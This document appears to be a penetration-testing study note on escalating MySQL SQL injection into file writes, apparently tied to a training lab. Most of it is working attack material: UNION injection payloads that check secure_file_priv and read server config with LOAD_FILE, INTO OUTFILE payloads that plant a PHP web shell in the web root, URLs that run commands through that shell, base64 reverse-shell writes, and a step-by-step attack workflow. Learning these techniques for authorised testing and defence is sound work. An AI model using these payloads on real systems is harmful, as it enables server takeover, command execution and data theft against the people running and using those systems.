## Purpose

SQL Injection can sometimes be leveraged to **write files to the backend server**.

This is extremely powerful because it may allow:

- writing arbitrary files
- dropping web shells
- modifying application behaviour
- achieving Remote Code Execution (RCE)
- full server compromise

Because of this risk, modern DBMS implementations restrict file write functionality heavily.

---

# Requirements for File Write

To write files via MySQL/MariaDB, three conditions must be met:

1. Database user has FILE privilege
2. MySQL variable secure_file_priv allows writing
3. DB service account has write permissions to target directory

---

# Step 1 – Confirm FILE Privilege

We previously identified that the database user has FILE privilege.

FILE allows:

- reading files
- writing files
- exporting query results

---

# Step 2 – Check secure_file_priv

secure_file_priv restricts where files can be written.

Possible values:

| Value | Meaning |
|------|--------|
| empty | read/write anywhere |
| path (e.g. /var/lib/mysql-files/) | can only read/write in this directory |
| NULL | file operations disabled |

---

## Query

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

---

## UNION Injection Payload

```sql
cn' UNION SELECT 1,variable_name,variable_value,4 
FROM information_schema.global_variables 
WHERE variable_name="secure_file_priv"-- -
```

---

## Example Result

```
secure_file_priv    (empty)
```

Meaning:

```
File read/write permitted anywhere
```

---

# Step 3 – Write Files Using SELECT INTO OUTFILE

MySQL allows exporting query results into files.

---

## Basic Syntax

```sql
SELECT data INTO OUTFILE '/path/file.txt'
```

---

## Example – Export table data

```sql
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
```

---

## Example output file

```
1 admin 392037dbba51f692776d6cefb6dd546d
2 user  9da2c9bcdf39d8610954e0e11ea8f45f
```

File owner:

```
mysql:mysql
```

---

# Writing Arbitrary Text Files

We can write strings directly to files.

---

## Example

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

---

## Verify file

```bash
cat /tmp/test.txt
```

```
this is a test
```

---

# SQLi Payload – Write File

We adapt this using UNION injection.

---

## Example payload

```sql
cn' UNION SELECT 1,'file written successfully!',3,4 
INTO OUTFILE '/var/www/html/proof.txt'-- -
```

---

## Verify via browser

```
http://target/proof.txt
```

Expected output:

```
file written successfully!
```

---

# Finding Web Root Directory

To write executable files, we must locate the web root.

Common Linux paths:

```
/var/www/html/
/var/www/
/srv/www/
/usr/share/nginx/html/
```

---

## Identify web root via config files

Apache:

```
/etc/apache2/apache2.conf
/etc/httpd/conf/httpd.conf
```

Nginx:

```
/etc/nginx/nginx.conf
```

IIS:

```
C:\Windows\System32\inetsrv\Config\ApplicationHost.config
```

---

## Example – read Apache config

```sql
cn' UNION SELECT 1,LOAD_FILE('/etc/apache2/apache2.conf'),3,4-- -
```

---

# Writing a Web Shell

Once write access is confirmed, we can write executable server-side code.

Example PHP web shell:

```php
<?php system($_REQUEST[0]); ?>
```

Allows command execution via URL parameter.

---

## SQLi payload

```sql
cn' UNION SELECT "",
'<?php system($_REQUEST[0]); ?>',
"",
"" 
INTO OUTFILE '/var/www/html/shell.php'-- -
```

---

# Executing Commands

Access shell:

```
http://target/shell.php?0=id
```

---

## Example output

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirms:

```
Remote command execution
```

---

# Writing Binary Files

Binary payloads can be written using Base64 encoding.

---

## Example

```sql
SELECT FROM_BASE64("base64data")
INTO OUTFILE '/var/www/html/file.bin';
```

Useful for:

- reverse shells
- compiled payloads
- scripts

---

# Common Payload Patterns

## Write proof file

```sql
UNION SELECT 'test'
INTO OUTFILE '/var/www/html/test.txt'
```

---

## Write PHP shell

```sql
UNION SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php'
```

---

## Write reverse shell (base64)

```sql
UNION SELECT FROM_BASE64("payload")
INTO OUTFILE '/var/www/html/rev.php'
```

# Common Issues

### secure_file_priv restricts directory

Check allowed path:

```sql
SELECT @@secure_file_priv;
```

---

### insufficient privileges

Error:

```
The MySQL server is running with the --secure-file-priv option
```

---

### directory not writable

MySQL service account must have write permission.

Typically:

```
mysql user
www-data user
```

---

# Attack Workflow

### 1. confirm FILE privilege

```sql
SELECT user()
```

---

### 2. check secure_file_priv

```sql
SELECT variable_value 
FROM information_schema.global_variables 
WHERE variable_name="secure_file_priv"
```

---

### 3. test write

```sql
UNION SELECT 'test'
INTO OUTFILE '/var/www/html/test.txt'
```

---

### 4. write web shell

```sql
UNION SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php'
```

---

### 5. execute commands

```
http://target/shell.php?cmd=id
```

---

# Key Takeaways

- Writing files enables full compromise
- secure_file_priv heavily impacts feasibility
- web root discovery is critical
- web shells provide command execution
- FILE privilege is highly sensitive
